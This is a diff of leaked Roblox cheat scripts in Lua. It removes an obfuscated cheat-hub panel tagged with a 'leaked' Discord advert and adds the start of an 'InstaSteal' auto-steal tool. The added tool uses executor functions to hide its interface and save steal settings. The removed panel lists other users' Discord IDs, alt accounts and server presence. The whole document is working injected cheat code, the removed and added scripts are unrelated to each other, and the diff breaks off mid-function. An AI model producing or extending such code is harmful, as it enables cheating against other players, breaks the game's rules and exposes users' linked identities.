-	up_282 = tbl22  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_283 = slicedfn39
-	up_284 = slicedfn38
-	up_285 = localPlayer
-	up_286 = Players
-	up_287 = slicedfn43
-	up_288 = ScreenGui
-	up_289 = tbl19
-	up_290 = tbl25
-	up_291 = flag18
-
-	up_292 = slicedfn31  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	;(function()local B,I=Color3.fromRGB(129,140,248),Color3.fromRGB(255,77,141);local function e(H)return string.match(tostring(H.division_name or""),"%[([^%]]+)%]%s*$");end;local function H(a)local K=e(a);if not K then return"Kings";end;if string.lower(string.sub(K,-1))=="s"then return K;end;return K.."s";end;local e={};local function a(K)if K=="Kings"then return B;end;if K=="Slaves"then return I;end;local I=e[K];if not I then local L=0;for A=1,#K,1 do L+=string.byte(K,A);end;I=Color3.fromHSV(L%360/360,0.62,0.95);e[K]=I;end;return I;end;local I,e,K="Kings",false;local L,A,P,v={},{},{};local N,S,j=48,40,4;local function p(W)return N+6+W*S+(W-1)*j+8;end;local W=up_279("Frame",{Size=UDim2.new(1,0,0,34),BackgroundTransparency=1,LayoutOrder=up_280(up_281),ZIndex=2,Parent=up_281});local r={};local s={"Kings"};local y=nil;local h=nil;local _=nil;_=function(o,E)local R=table.concat(o,"|");if R~=y then y,s=R,o;for y,y in pairs(r)do y:Destroy();end;r={};local y=#o;for R,J in ipairs(o)do local l=up_279("TextButton",{Position=UDim2.new((R-1)/y,R>1 and 1 or 0,0,0),Size=UDim2.new(1/y,-1,1,0),BackgroundTransparency=1,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text=J.." (0)",TextColor3=J==I and(a(J))or up_282.TextDim,TextSize=18,ZIndex=3,Parent=W});l.MouseButton1Click:Connect(function()if I~=J then I=J;h(true);if v then v();end;end;end);r[J]=l;end;end;for y,R in ipairs(o)do y=r[R];if y then y.Text=R.." ("..(E[R]or 0)..")";end;end;end;local y=up_279("Frame",{AnchorPoint=Vector2.new(0.5,1),Position=UDim2.new(0.5,0,1,0),Size=UDim2.fromOffset(56,2),BackgroundColor3=B,BorderSizePixel=0,ZIndex=3,Parent=W});up_283(y,1);h=function(B)local W,o=#s,1;for E,R in ipairs(s)do local J=r[R];if J then J.TextColor3=R==I and(a(R))or up_282.TextDim;end;o=if R==I then E else o;end;local r,E=UDim2.new(W>0 and(o-0.5)/W or 0.5,0,1,0),a(I);if B then up_284(y,0.18,{Position=r,BackgroundColor3=E});else y.Position=r;y.BackgroundColor3=E;end;end;_(s,{});h(false);local B=up_279("Frame",{Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,LayoutOrder=up_280(up_281),ZIndex=2,Parent=up_281});up_279("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=B});local a,W,r=up_279("TextLabel",{Size=UDim2.new(1,0,0,60),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text="No users yet \226\128\148 waiting for the WebSocket...",TextColor3=up_282.TextDim,TextSize=16,ZIndex=2,Parent=B}),{{text="\255"}},{};local function s(y)if not y or y==""then return W;end;local W=r[y];if W then return W;end;local W,o,E=tostring(y):gsub("%s*%[[^%]]+%]%s*$",""),{},1;while E<=#W do local R,J=W:find("%d+",E);if R then if R>E then table.insert(o,{text=W:sub(E,R-1):lower()});end;table.insert(o,{num=tonumber(W:sub(R,J))});E=J+1;else table.insert(o,{text=W:sub(E):lower()});break;end;end;o=if#o==0 then{{text=W:lower()}}else o;r[y]=o;return o;end;local function W(r,y)local o,E=s(r),s(y);for s=1,math.max(#o,#E),1 do y,r=o[s],E[s];if not y then return true;end;if not r then return false;end;if y.text and r.text then if y.text~=r.text then return y.text<r.text;end;elseif y.num and r.num then if y.num~=r.num then return y.num<r.num;end;elseif y.text then return true;else return false;end;end;return nil;end;local function r(s,y,o)if s then return"you",up_282.Accent,true;end;if y then return"in server",up_282.Good,true;end;if not o then return"stale",up_282.TextDim,false;end;return"online",up_282.TextDim,false;end;local function s(y)return(tostring(y):gsub("&","&amp;"):gsub("<","&lt;"):gsub(">","&gt;"));end;local y={};local function o(E)local R=E or"";local J=y[R];if J then return J;end;J=nil;if E and E~=""then local l,T=pcall(Color3.fromHex,E);J=if l then T else J;end;E=nil;if not J then E="#A5ADFA";else J=if J.R*0.299+J.G*0.587+J.B*0.114<0.35 then(J:Lerp(Color3.new(1,1,1),0.45))else J;E=(string.format("#%02X%02X%02X",math.floor(J.R*255+0.5),math.floor(J.G*255+0.5),math.floor(J.B*255+0.5)));end;y[R]=E;return E;end;local function y(E)return string.upper(E:sub(1,(utf8.offset(E,2)or 2)-1));end;local function E(R,J,l,T,d,M,C,V)local F=up_279("Frame",{Position=d,Size=UDim2.fromOffset(T,T),BackgroundColor3=up_282.Background,BackgroundTransparency=C and 0.5 or 0.2,BorderSizePixel=0,ZIndex=V,Parent=R});up_283(F,math.ceil(T/2));up_279("UIStroke",{Color=M,Transparency=C and 0.5 or 0.15,Thickness=1.5,Parent=F});R,d=up_279("TextLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="?",TextColor3=up_282.Accent2,TextTransparency=C and 0.45 or 0.1,TextSize=math.max(9,math.floor(T*0.4)),ZIndex=V,Parent=F}),up_279("ImageLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Image="",ImageTransparency=C and 0.45 or 0,ZIndex=V+1,Parent=F});up_283(d,math.ceil(T/2));C=L[J];V=C and(C.DisplayName or C.Name);if V and#V>0 then R.Text=y(V);end;if C and C.Avatar and C.Avatar~=""then d.Image=C.Avatar;end;if not C or not C.Name or not C.Avatar or C.Avatar==""then A[#A+1]={uidStr=J,uidNum=l,avatar=d,letter=R};end;return F;end;local function R(J,l,T,d,M)local C,V=tonumber(l.user_id),tostring(l.user_id);local F,U,q=V==M,d[V]==true,l.is_connected~=false;local m,Q,c,g=not q,r(F,U,q);q,d=up_279("Frame",{Position=UDim2.new(0,10,0,T),Size=UDim2.new(1,-20,0,S),BackgroundTransparency=1,ZIndex=2,Parent=J}),F and up_282.Accent or(U and up_282.Good or up_282.Stroke);E(q,V,C,28,UDim2.fromOffset(0,(S-28)/2),d,m,2);M=up_279("Frame",{Position=UDim2.fromOffset(38,3),Size=UDim2.new(1,-138,0,18),BackgroundTransparency=1,ClipsDescendants=true,ZIndex=2,Parent=q});up_279("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=M});U=up_279("TextLabel",{AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Loading...",TextColor3=up_282.Text,TextTransparency=m and 0.45 or 0,TextSize=16,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,ZIndex=2,Parent=M});up_279("UISizeConstraint",{MaxSize=Vector2.new(230,math.huge),Parent=U});d=l.ws or l.ws_region or l.region;J=up_279("TextLabel",{AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,0,16),BackgroundColor3=up_282.ElementHover,BackgroundTransparency=m and 0.6 or 0.25,Font=Enum.Font.GothamMedium,Text="WS: "..(d~=nil and d~=""and(tostring(d))or"\226\128\148"),TextColor3=up_282.TextDim,TextTransparency=m and 0.45 or 0.1,TextSize=12,LayoutOrder=2,ZIndex=2,Parent=M});up_283(J,8);up_279("UIPadding",{PaddingLeft=UDim.new(0,7),PaddingRight=UDim.new(0,7),Parent=J});up_279("UISizeConstraint",{MaxSize=Vector2.new(120,math.huge),Parent=J});F=up_279("TextLabel",{Position=UDim2.fromOffset(38,22),Size=UDim2.new(1,-138,0,13),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text="@...",TextColor3=up_282.TextDim,TextTransparency=m and 0.45 or 0,TextSize=13,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=q});up_279("TextLabel",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,0,0.5,0),Size=UDim2.fromOffset(70,14),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text=Q,TextColor3=c,TextTransparency=m and 0.35 or 0,TextSize=13,TextXAlignment=Enum.TextXAlignment.Right,ZIndex=2,Parent=q});M=up_279("Frame",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-76,0.5,0),Size=UDim2.fromOffset(6,6),BackgroundColor3=c,BackgroundTransparency=g and 0 or 1,BorderSizePixel=0,ZIndex=2,Parent=q});up_283(M,3);if not g then up_279("UIStroke",{Color=c,Transparency=m and 0.4 or 0.2,Thickness=1,Parent=M});end;T=L[V];if T then if T.DisplayName then U.Text=T.DisplayName;end;if T.Name then F.Text="@"..T.Name;end;end;if not T or not T.Name then A[#A+1]={uidStr=V,uidNum=C,dName=U,uName=F};end;end;v=function()A={};for r,r in ipairs(B:GetChildren())do if r:IsA("Frame")and r.Name=="UserCard"then r:Destroy();end;end;local r=K;if type(r)~="table"or#r==0 then a.Visible=true;return;end;local J=tostring(up_285.UserId);if not e then for l,l in ipairs(r)do if type(l)=="table"and tostring(l.user_id)==J then I,e=H(l),true;break;end;end;end;local e={};for l,T in ipairs(r)do if type(T)=="table"then l=H(T);local H=e[l];if not H then H={};e[l]=H;end;table.insert(H,T);end;end;r={};for H in pairs(e)do if H~="Kings"then r[#r+1]=H;end;end;table.sort(r);if e.Kings then table.insert(r,1,"Kings");end;if#r==0 then r[1]="Kings";end;local H={};for l,T in pairs(e)do local d={};for M,C in ipairs(T)do M=C.discord_id;if M and M~=""and M~="unknown"then d[M]=true;end;end;T=0;for M in pairs(d)do T+=1;end;H[l]=T;end;_(r,H);if not e[I]or#e[I]==0 then I=r[1];for _,_ in ipairs(r)do if e[_]and#e[_]>0 then I=_;break;end;end;end;h(true);r=e[I]or{};if#r==0 then a.Text="No users found";a.Visible=true;return;end;a.Visible=false;local I={};for a,a in ipairs(up_286:GetPlayers())do I[tostring(a.UserId)]=true;end;local function a(h)local _=tostring(h.user_id);if _==J then return 0;end;if I[_]then return 1;end;if h.is_connected~=false then return 2;end;return 3;end;H,e={},{};for h,_ in ipairs(r)do h=_.discord_id;if not h or h==""or h=="unknown"then table.insert(e,_);else H[h]=H[h]or{};table.insert(H[h],_);end;end;local h={};local function _(l,T,d)local M,C,V=false,0,false;for F,U in ipairs(T)do F=tostring(U.user_id);M,C,V=if F==J then true else M,if I[F]and F~=J then C+1 else C,if U.is_connected~=false then true else V;end;table.sort(T,function(F,U)local q,m=a(F),a(U);if q~=m then return q<m;end;return tostring(F.user_id)<tostring(U.user_id);end);h[#h+1]={discordId=l,users=T,divName=T[1]and T[1].division_name or"",divColor=T[1]and T[1].division_color or"",inServer=M or C>0,inSrvN=C,staleOnly=not V and not M and C==0,userId=d or""};end;for a,l in pairs(H)do _(a,l);end;for a,a in ipairs(e)do _("",{a},tostring(a.user_id));end;table.sort(h,function(a,l)if a.inServer~=l.inServer then return a.inServer;end;local T=W(a.divName,l.divName);if T~=nil then return T;end;return a.discordId.."|"..a.userId<l.discordId.."|"..l.userId;end);for a,W in ipairs(h)do r=#W.users;local h,l=p(r),W.discordId~=""and W.discordId or"u:"..W.userId;local p=P[l];if p==nil then p=W.staleOnly;end;e=W.staleOnly;local T=up_279("Frame",{Name="UserCard",Size=UDim2.new(1,0,0,p and N or h),BackgroundColor3=up_282.Element,BackgroundTransparency=e and 0.4 or 0,BorderSizePixel=0,ClipsDescendants=true,LayoutOrder=a,ZIndex=2,Parent=B});up_283(T,10);up_279("UIStroke",{Color=up_282.Stroke,Transparency=e and 0.6 or 0.35,Thickness=1,Parent=T});_=math.min(3,r);for B=_,1,-1 do a=W.users[B];H=tostring(a.user_id);local d=H==J and up_282.Accent or(I[H]and up_282.Good or up_282.Stroke);E(T,H,tonumber(a.user_id),26,UDim2.fromOffset(10+(B-1)*13,(N-26)/2),d,e or a.is_connected==false,3+(_-B));end;local B,H=36+(_-1)*13+10,30+(W.discordId~=""and 60 or 0)+(W.inSrvN>0 and 142 or 0);a=up_279("Frame",{Position=UDim2.fromOffset(B,6),Size=UDim2.new(1,-(B+H),0,20),BackgroundTransparency=1,ClipsDescendants=true,ZIndex=4,Parent=T});up_279("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=a});H=up_279("TextLabel",{AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Loading...",TextColor3=up_282.Text,TextTransparency=e and 0.45 or 0,TextSize=16,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,ZIndex=4,Parent=a});if r>1 then up_279("TextLabel",{AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,1,0),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text="+"..r-1 ..(r==2 and" alt"or" alts"),TextColor3=up_282.TextDim,TextTransparency=e and 0.45 or 0.1,TextSize=12,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=2,ZIndex=4,Parent=a});end;a=W.users[1];local _=tostring(a.user_id);local E=L[_];if E and(E.DisplayName or E.Name)then H.Text=E.DisplayName or E.Name;end;if not E or not E.Name then A[#A+1]={uidStr=_,uidNum=tonumber(a.user_id),dName=H};end;H=r==1 and"1 account"or r.." accounts";up_279("TextLabel",{Position=UDim2.fromOffset(B,27),Size=UDim2.new(0.6,0,0,13),BackgroundTransparency=1,RichText=true,Font=Enum.Font.Gotham,Text=if W.divName~=""then(if W.discordId==""then H.." \194\183 no Discord linked"else H).." \194\183 <font color=\""..o(W.divColor).."\">"..s(W.divName).."</font>"else if W.discordId==""then H.." \194\183 no Discord linked"else H,TextColor3=up_282.TextDim,TextTransparency=e and 0.45 or 0,TextSize=12,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=4,Parent=T});local B=up_279("TextLabel",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-10,0,N/2),Size=UDim2.fromOffset(16,16),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="v",TextColor3=up_282.TextDim,TextTransparency=e and 0.35 or 0,TextSize=14,Rotation=p and-90 or 0,ZIndex=4,Parent=T});if W.discordId~=""or W.inSrvN>0 then H=up_279("Frame",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-32,0,N/2),AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,0,26),BackgroundTransparency=1,ZIndex=7,Parent=T});up_279("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,VerticalAlignment=Enum.VerticalAlignment.Center,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=H});if W.discordId~=""then E=up_279("TextButton",{Name="CopyIdChip",Size=UDim2.fromOffset(48,26),BackgroundTransparency=1,AutoButtonColor=false,Text="",LayoutOrder=1,ZIndex=7,Parent=H});local r=up_279("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),Size=UDim2.fromOffset(48,18),BackgroundColor3=up_282.ElementHover,BackgroundTransparency=e and 0.35 or 0,BorderSizePixel=0,ZIndex=7,Parent=E});up_283(r,9);local s,o=up_279("UIStroke",{Color=up_282.Stroke,Transparency=e and 0.5 or 0.2,Thickness=1,Parent=r}),up_279("Frame",{Position=UDim2.fromOffset(8,3),Size=UDim2.fromOffset(12,12),BackgroundTransparency=1,ZIndex=8,Parent=r});_=up_279("Frame",{Position=UDim2.fromOffset(4,0),Size=UDim2.fromOffset(8,8),BackgroundTransparency=1,ZIndex=8,Parent=o});up_283(_,2);local d,M=up_279("UIStroke",{Color=up_282.TextDim,Transparency=e and 0.4 or 0.1,Thickness=1.2,Parent=_}),up_279("Frame",{Position=UDim2.fromOffset(0,4),Size=UDim2.fromOffset(8,8),BackgroundColor3=up_282.ElementHover,BackgroundTransparency=e and 0.35 or 0,BorderSizePixel=0,ZIndex=9,Parent=o});up_283(M,2);local _,C,V=up_279("UIStroke",{Color=up_282.TextDim,Transparency=e and 0.4 or 0.1,Thickness=1.2,Parent=M}),up_279("TextLabel",{Position=UDim2.fromOffset(24,0),Size=UDim2.new(1,-26,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="ID",TextColor3=up_282.TextDim,TextTransparency=e and 0.35 or 0,TextSize=12,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=8,Parent=r}),up_279("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),Size=UDim2.fromOffset(12,12),BackgroundTransparency=1,Visible=false,ZIndex=8,Parent=r});local e=up_279("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromOffset(4,8),Size=UDim2.fromOffset(5,2),Rotation=45,BackgroundColor3=up_282.Good,BorderSizePixel=0,ZIndex=8,Parent=V});up_283(e,1);local M=up_279("Frame",{AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromOffset(7.5,6),Size=UDim2.fromOffset(9,2),Rotation=-45,BackgroundColor3=up_282.Good,BorderSizePixel=0,ZIndex=8,Parent=V});up_283(M,1);local F=false;local function U(q)if F then return;end;local m=q and up_282.Accent or up_282.TextDim;up_284(s,0.12,{Color=q and up_282.Accent or up_282.Stroke,Transparency=q and 0.35 or 0.2});up_284(C,0.12,{TextColor3=m});up_284(d,0.12,{Color=m});up_284(_,0.12,{Color=m});end;E.MouseEnter:Connect(function()U(true);end);E.MouseLeave:Connect(function()U(false);end);E.MouseButton1Click:Connect(function()if F then return;end;local E=pcall(function()setclipboard(tostring(W.discordId));end);F=true;local U=E and up_282.Good or up_282.Bad;if E then o.Visible=false;C.Visible=false;local E=U:Lerp(up_282.Text,0.15);e.BackgroundColor3=E;M.BackgroundColor3=E;V.Visible=true;elseif up_287 then pcall(up_287 ,"AJ Users","Copy failed \226\128\148 no clipboard access");end;up_284(r,0.12,{BackgroundColor3=up_282.Element:Lerp(U,0.16)});up_284(s,0.12,{Color=U,Transparency=0.45});task.delay(1.2,function()if not r:IsDescendantOf(up_288)then return;end;F=false;V.Visible=false;o.Visible=true;C.Visible=true;C.TextColor3=up_282.TextDim;d.Color=up_282.TextDim;_.Color=up_282.TextDim;up_284(r,0.15,{BackgroundColor3=up_282.ElementHover});up_284(s,0.15,{Color=up_282.Stroke,Transparency=0.2});end);end);end;if W.inSrvN>0 then a=up_279("TextLabel",{AutomaticSize=Enum.AutomaticSize.X,Size=UDim2.new(0,0,0,20),BackgroundColor3=up_282.Good,BackgroundTransparency=0.84,Font=Enum.Font.GothamBold,Text=W.inSrvN.." IN YOUR SERVER",TextColor3=up_282.Good,TextSize=12,LayoutOrder=2,ZIndex=7,Parent=H});up_283(a,10);up_279("UIPadding",{PaddingLeft=UDim.new(0,9),PaddingRight=UDim.new(0,9),Parent=a});up_279("UIStroke",{Color=up_282.Good,Transparency=0.55,Thickness=1,Parent=a});end;end;up_279("TextButton",{Size=UDim2.new(1,0,0,N),BackgroundTransparency=1,AutoButtonColor=false,Text="",ZIndex=6,Parent=T}).MouseButton1Click:Connect(function()p=not p;P[l]=p;up_284(T,0.22,{Size=UDim2.new(1,0,0,p and N or h)});up_284(B,0.22,{Rotation=p and-90 or 0});end);up_279("Frame",{Position=UDim2.new(0,10,0,N),Size=UDim2.new(1,-20,0,1),BackgroundColor3=up_282.Stroke,BackgroundTransparency=0.3,BorderSizePixel=0,ZIndex=2,Parent=T});for B,e in ipairs(W.users)do R(T,e,N+6+(B-1)*(S+j),I,J);end;end;if#A>0 then local B=A;A={};task.spawn(function()local I,e={},{};for H,H in ipairs(B)do if H.uidNum and not e[H.uidStr]and not(L[H.uidStr]and L[H.uidStr].Name)then e[H.uidStr]=true;I[#I+1]=H.uidNum;end;end;if#I>0 then pcall(function()for H,a in ipairs(game:GetService("UserService"):GetUserInfosByUserIdsAsync(I)or{})do H=tostring(a.Id);local I=L[H];if not I then I={};L[H]=I;end;I.Name=a.Username;I.DisplayName=a.DisplayName;end;end);end;for I,H in ipairs(B)do e=L[H.uidStr];if H.dName and(H.dName:IsDescendantOf(up_288))then H.dName.Text=e and e.DisplayName or H.uidStr;end;if H.uName and(H.uName:IsDescendantOf(up_288))then H.uName.Text="@"..(e and e.Name or H.uidStr);end;if H.letter and(H.letter:IsDescendantOf(up_288))then I=e and(e.DisplayName or e.Name);if I and#I>0 then H.letter.Text=y(I);end;end;end;for I,I in ipairs(B)do if I.avatar then local B=L[I.uidStr];if not B then B={};L[I.uidStr]=B;end;if I.uidNum and(not B.Avatar or B.Avatar=="")then pcall(function()B.Avatar=up_286:GetUserThumbnailAsync(I.uidNum,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size100x100);end);end;if B.Avatar and B.Avatar~=""and(I.avatar:IsDescendantOf(up_288))then I.avatar.Image=B.Avatar;end;end;end;end);end;end;local B=false;up_289.usersUpdate=function(I)K=I;if up_290.setSubSlot then pcall(up_290.setSubSlot,I);end;if up_281.Visible and not B then B=true;task.defer(function()B=false;if up_291 and up_281.Visible then v();end;end);end;end;up_292 (up_281:GetPropertyChangedSignal("Visible"):Connect(function()if up_281.Visible then v();end;end));end)()
-	slicedfn48(sliced96, "Subscription")
-
-	do
-		local v = slicedfn49(sliced96, "Status: —")
-		sliced100 = slicedfn49(sliced96, "Slot: —")
-		local sliced101 = slicedfn49(sliced96, "Time left: —")
-
-		if type(huge) == "number" then
-			v.Text = "Status: active (Luarmor)"
-
-			task.spawn(function()
-				local sliced102 = huge  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local now2 = os.clock()
-
-				while flag18 and sliced101.Parent do
-					local slicedn34 = math.max(0, sliced102 - (os.clock() - now2))
-					local floor2 = math.floor
-					sliced101.Text = ("Time left: %dd %02dh %02dm"):format(math.floor(slicedn34 / 86400), math.floor(slicedn34 % 86400 / 3600), floor2(slicedn34 % 3600 / 60))
-					task.wait(30)
-				end
-
-			end)
-		end
-	end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-end
-
-do
-	local str10 = tostring(localPlayer.UserId)
-	local v = nil
-
-	tbl25.setSubSlot = function(arg)
-		local sliced101 = "table"
-
-		if type(arg) ~= sliced101 then
-			return
-		end
-
-		for _, sliced102 in ipairs(arg) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			if type(sliced102) == "table" and tostring(sliced102.user_id) == str10 then
-				local divisionName = sliced102.division_name
-				local sliced103 = "string"
-
-				if type(divisionName) == sliced103 and divisionName ~= "" and divisionName ~= v then
-					v = divisionName
-					sliced100.Text = "Slot: " .. divisionName
-				end
-
-				return
-			end
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-end
-
-slicedfn49(sliced96, tbl20.DiscordInvite)
-
-tbl19.feedAdd = function(arg, arg2, arg3, arg4, arg5, arg6)
-	if not sliced97 then
-		return false
-	end
-	return sliced97(arg, arg2, arg3, arg4, arg5, arg6) ~= nil
-end
-
-tbl19.feedRemove = function(arg)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	if sliced98 then
-		sliced98(arg)
-	end
-end
-
-up_293 = sliced99
-tbl19.feedReset = function()if up_293 then up_293 ();end;end
-tbl19.setWsStatus = sliced86
-
-tbl19.notify = function(...)
-	if slicedfn43 then
-		slicedfn43(...)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-end
-
-tbl19.latencyTable = function(arg, arg2)
-	if tbl25.latOnServerTable then
-		pcall(tbl25.latOnServerTable, arg, arg2)
-	end
-end
-
-tbl19.isAlive = function()
-	if true then
-		return flag18  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-
-end
-
-tbl19.showWsError = function(arg)
-	if sliced91 then
-		sliced91(arg)
-
-	end
-end
-
-tbl19.hideWsError = function()
-	if sliced92 then
-		sliced92()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-end
-
-slicedfn41(ScreenGui)
-slicedfn45(1)
-
-if tbl23.MinimizeOnInject then
-	flag19 = true
-	sliced85.Scale = sliced84
-	flag20 = true
-
-	do
-		local absoluteSize = ScreenGui.AbsoluteSize  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
-			task.wait()
-			absoluteSize = ScreenGui.AbsoluteSize
-		end
-
-		local flag21 = absoluteSize.X > 0 and absoluteSize.Y > 0
-		local slicedn34 = 0
-		local slicedn35 = 0
-
-		if flag21 then
-			do
-				local max = math.max  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local v = 0
-				local slicedn36 = absoluteSize.X - n
-				slicedn35 = math.clamp(math.floor(absoluteSize.X * 0.5 - x2 / 2), 0, max(v, slicedn36))
-			end
-
-			local v = 0
-			local max = math.max
-			local slicedn36 = absoluteSize.Y - slicedn33
-			slicedn34 = math.clamp(math.floor(absoluteSize.Y * 0.5 - y2 / 2), v, max(0, slicedn36))
-		end
-
-		sliced93.Position = UDim2.fromOffset(slicedn35, slicedn34)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-
-	sliced94.Scale = 1
-	sliced93.Visible = true
-	flag20 = false
-else
-	Frame.Visible = true
-	slicedfn38(sliced85, 0.5, { Scale = sliced84 }, Enum.EasingStyle.Back)
-end
-
-task.delay(0.55, function()
-	if flag18 and not flag19 and not flag20 and not tbl23.MinimizeOnInject then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		sliced87()
-	end
+pcall(function()
+    local old = CoreGui:FindFirstChild("InstaSteal_Standalone")
+    if old then old:Destroy() end
 end)
+local CONFIG_PATH = "FR Hub/wallahi_config.json"
+local Radii = {Normal = 60, Semi = 9, SemiV2 = 51, SemiV3 = 60}
+local selectedMode   = "SemiV3"
+local isEnabled      = true
+local uiScaleValue   = 100
+local mainUIScale    = nil
+local function saveConfig()
+    pcall(function()
+        local data = {
+            normalRadius = Radii.Normal,
+            semiRadius   = Radii.Semi,
+            semiV2Radius = Radii.SemiV2,
+            semiV3Radius = Radii.SemiV3,
+            mode         = selectedMode,
+            enabled      = isEnabled,
+            uiScale      = uiScaleValue,
+        }
+        writefile(CONFIG_PATH, game:GetService("HttpService"):JSONEncode(data))
+    end)
+end
+local function loadConfig()
+    pcall(function()
+        if not isfile(CONFIG_PATH) then return end
+        local raw = readfile(CONFIG_PATH)
+        local ok, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
+        if not ok or type(data) ~= "table" then return end
+        if type(data.normalRadius) == "number" then Radii.Normal = data.normalRadius end
+        if type(data.semiRadius)   == "number" then Radii.Semi   = data.semiRadius   end
+        if type(data.semiV2Radius) == "number" then Radii.SemiV2 = data.semiV2Radius end
+        if type(data.semiV3Radius) == "number" then Radii.SemiV3 = data.semiV3Radius end
+        -- Only the SemiV3 engine is implemented in this script.
+        -- Old configs that saved mode "Normal"/"Semi"/"SemiV2" were silently
+        -- disabling the auto steal entirely, so always force SemiV3.
+        selectedMode = "SemiV3"
+        if type(data.enabled) == "boolean" then isEnabled = data.enabled end
+        if type(data.uiScale) == "number"  then uiScaleValue = math.clamp(math.floor(data.uiScale + 0.5), 50, 200) end
+    end)
+end
+loadConfig()
+local ProgressBarFill = nil
+local ProgressPercentLabel = nil
+local grabPercentageLabel = nil
+local _currentStealProgress = 0
+_G.HorizonHubIntroFinished = false
+local function setProgress(val, labelText)
+    _currentStealProgress = math.clamp(val, 0, 1)
+    if _G.StealBar then
+        _G.StealBar.SetState("STEALING")
+        _G.StealBar.SetProgress(_currentStealProgress, labelText)
+    end
+    if ProgressBarFill then
+        TweenService:Create(ProgressBarFill, TweenInfo.new(0.05), {
+            Size = UDim2.new(_currentStealProgress, 0, 1, 0)
+        }):Play()
+    end
+    if ProgressPercentLabel then
+        ProgressPercentLabel.Text = math.floor(_currentStealProgress * 100 + 0.5) .. "%"
+    end
+    if grabPercentageLabel then
+        if type(labelText) == "string" and labelText ~= "" then
+            grabPercentageLabel.Text = string.upper(labelText)
+        elseif _currentStealProgress > 0 then
+            grabPercentageLabel.Text = "STEALING  " .. math.floor(_currentStealProgress * 100 + 0.5) .. "%"
+        else
+            grabPercentageLabel.Text = "GRAB PERCENTAGE"
+        end
+    end
+end
+
+-- Nexus-style steal HUD card (AUTO STEAL | state | FPS/ping | % + progress line)
+local function setupNexusGrabBar()
+    local pg=LP:WaitForChild("PlayerGui"); local old=pg:FindFirstChild("StealBarGui"); if old then old:Destroy() end
+    local cg=game:GetService("CoreGui"); local oldc=cg:FindFirstChild("StealBarGui"); if oldc then oldc:Destroy() end
+    local gui=Instance.new("ScreenGui"); gui.Name="StealBarGui"; gui.ResetOnSpawn=false; gui.IgnoreGuiInset=true; gui.Enabled=false
+    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+    if not pcall(function() gui.Parent=cg end) then gui.Parent=pg end
+
+    local savedPos=nil
+    pcall(function()
+        if isfile and isfile("horizon_steal_bar_pos.json") then savedPos=game:GetService("HttpService"):JSONDecode(readfile("horizon_steal_bar_pos.json")) end
+    end)
+    local pos=(type(savedPos)=="table" and UDim2.new(savedPos.xs or .5,savedPos.xo or -128,savedPos.ys or .78,savedPos.yo or 0)) or UDim2.new(.5,-128,.78,0)
+
+    local ACCENT=Color3.fromRGB(0,145,255)
+    local ACCENT_LIT=Color3.fromRGB(90,190,255)
